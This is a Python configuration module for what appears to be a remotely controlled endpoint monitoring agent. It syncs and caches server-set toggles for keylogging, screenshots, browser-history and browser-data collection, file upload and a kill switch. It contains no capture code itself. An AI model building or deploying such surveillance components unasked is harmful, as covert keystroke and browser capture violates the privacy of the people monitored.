"""
Configuration manager for syncing and caching device settings.
"""

import logging
import random
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger(__name__)


@dataclass
class DeviceConfig:
    """Device configuration data."""
    
    # Master kill switch
    kill_switch: bool = False
    
    # Feature toggles
    screenshots_enabled: bool = False
    keylogger_enabled: bool = False
    browser_triggers_enabled: bool = False
    file_upload_enabled: bool = False
    browser_data_enabled: bool = False
    
    # Intervals (seconds)
    config_sync_interval: int = 900  # 15 minutes
    keylog_sync_interval: int = 300  # 5 minutes
    browser_history_sync_interval: int = 14400  # 4 hours
    
    # Screenshot settings
    screenshot_quality: int = 75
    
    # Browser monitoring
    monitored_browsers: List[str] = field(default_factory=lambda: [
        'chrome.exe', 'firefox.exe', 'msedge.exe',
        'brave.exe', 'opera.exe', 'iexplore.exe'
    ])
    
    # Last update timestamp
    updated_at: Optional[str] = None
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'DeviceConfig':
        """Create config from dictionary."""
        return cls(
            kill_switch=data.get('kill_switch', False),
            screenshots_enabled=data.get('screenshots_enabled', False),
            keylogger_enabled=data.get('keylogger_enabled', False),
            browser_triggers_enabled=data.get('browser_triggers_enabled', False),
            file_upload_enabled=data.get('file_upload_enabled', False),
            browser_data_enabled=data.get('browser_data_enabled', False),
            config_sync_interval=data.get('config_sync_interval', 900),
            keylog_sync_interval=data.get('keylog_sync_interval', 300),
            browser_history_sync_interval=data.get('browser_history_sync_interval', 14400),
            screenshot_quality=data.get('screenshot_quality', 75),
            monitored_browsers=data.get('monitored_browsers', [
                'chrome.exe', 'firefox.exe', 'msedge.exe',
                'brave.exe', 'opera.exe', 'iexplore.exe'
            ]),
            updated_at=data.get('updated_at'),
        )
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert config to dictionary."""
        return {
            'kill_switch': self.kill_switch,
            'screenshots_enabled': self.screenshots_enabled,
            'keylogger_enabled': self.keylogger_enabled,
            'browser_triggers_enabled': self.browser_triggers_enabled,
            'file_upload_enabled': self.file_upload_enabled,
            'browser_data_enabled': self.browser_data_enabled,
            'config_sync_interval': self.config_sync_interval,
            'keylog_sync_interval': self.keylog_sync_interval,
            'browser_history_sync_interval': self.browser_history_sync_interval,
            'screenshot_quality': self.screenshot_quality,
            'monitored_browsers': self.monitored_browsers,
            'updated_at': self.updated_at,
        }


class ConfigManager:
    """
    Manages device configuration synchronization with the server.
    
    Features:
    - Periodic sync with randomized interval (to avoid server spikes)
    - Local caching for offline operation
    - Kill switch support
    - Config change callbacks
    """
    
    def __init__(self, queue_manager, api_client):
        self.queue_manager = queue_manager
        self.api_client = api_client
        
        self._config: DeviceConfig = DeviceConfig()
        self._last_sync: Optional[datetime] = None
        self._sync_thread: Optional[threading.Thread] = None
        self._running = False
        self._callbacks: List[Callable[[DeviceConfig], None]] = []
        self._lock = threading.Lock()
        
        # Load cached config
        self._load_cached_config()
    
    def _load_cached_config(self):
        """Load configuration from local cache."""
        cached = self.queue_manager.get_cached_config()
        if cached:
            self._config = DeviceConfig.from_dict(cached)
            logger.info("Loaded cached configuration")
        else:
            logger.info("No cached configuration, using defaults")
    
    def _save_cached_config(self):
        """Save current configuration to local cache."""
        self.queue_manager.set_cached_config(self._config.to_dict())
    
    @property
    def config(self) -> DeviceConfig:
        """Get current configuration."""
        with self._lock:
            return self._config
    
    @property
    def is_kill_switch_active(self) -> bool:
        """Check if kill switch is active."""
        return self._config.kill_switch
    
    def add_config_callback(self, callback: Callable[[DeviceConfig], None]):
        """Add a callback to be called when config changes."""
        self._callbacks.append(callback)
    
    def _notify_callbacks(self):
        """Notify all callbacks of config change."""
        for callback in self._callbacks:
            try:
                callback(self._config)
            except Exception as e:
                logger.error(f"Config callback error: {e}")
    
    def sync_config(self) -> bool:
        """
        Sync configuration from server.
        Returns True if sync was successful.
        """
        try:
            response = self.api_client.sync_config()
            
            if response and 'config' in response:
                new_config = DeviceConfig.from_dict(response['config'])
                
                with self._lock:
                    old_kill_switch = self._config.kill_switch
                    self._config = new_config
                    self._last_sync = datetime.now()
                
                # Save to cache
                self._save_cached_config()
                
                # Log kill switch changes
                if new_config.kill_switch != old_kill_switch:
                    if new_config.kill_switch:
                        logger.warning("Kill switch ACTIVATED")
                    else:
                        logger.info("Kill switch deactivated")
                
                # Notify callbacks
                self._notify_callbacks()
                
                logger.debug("Configuration synced successfully")
                return True
            
        except Exception as e:
            logger.error(f"Config sync error: {e}")
        
        return False
    
    def _get_next_sync_delay(self) -> float:
        """
        Get randomized delay for next sync.
        Adds ±10% jitter to avoid server spikes.
        """
        base_interval = self._config.config_sync_interval
        jitter = base_interval * 0.1
        return base_interval + random.uniform(-jitter, jitter)
    
    def _sync_loop(self):
        """Background sync loop."""
        while self._running:
            try:
                self.sync_config()
            except Exception as e:
                logger.error(f"Sync loop error: {e}")
            
            # Wait for next sync
            delay = self._get_next_sync_delay()
            
            # Sleep in small increments to allow quick shutdown
            elapsed = 0
            while self._running and elapsed < delay:
                time.sleep(min(5, delay - elapsed))
                elapsed += 5
    
    def start_sync(self):
        """Start background sync thread."""
        if self._running:
            return
        
        self._running = True
        self._sync_thread = threading.Thread(target=self._sync_loop, daemon=True)
        self._sync_thread.start()
        logger.info("Config sync started")
        
        # Do initial sync
        self.sync_config()
    
    def stop_sync(self):
        """Stop background sync thread."""
        self._running = False
        if self._sync_thread:
            self._sync_thread.join(timeout=10)
            self._sync_thread = None
        logger.info("Config sync stopped")


# Singleton instance
_config_manager: Optional[ConfigManager] = None


def get_config_manager() -> Optional[ConfigManager]:
    """Get the config manager instance."""
    return _config_manager


def init_config_manager(queue_manager, api_client) -> ConfigManager:
    """Initialize the config manager singleton."""
    global _config_manager
    _config_manager = ConfigManager(queue_manager, api_client)
    return _config_manager
